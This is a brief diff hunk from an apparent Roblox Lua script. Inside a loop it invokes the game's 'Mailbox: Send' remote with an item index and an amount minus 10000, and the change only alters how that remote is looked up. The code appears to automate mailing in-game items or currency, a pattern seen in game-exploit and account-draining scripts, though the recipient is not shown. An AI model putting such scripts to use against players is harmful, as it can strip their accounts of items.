@@ -159,7 +159,7 @@ spawn(function()
                         [4] = i,
                         [5] = v._am - 10000
                     }
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                 end
             end
         end
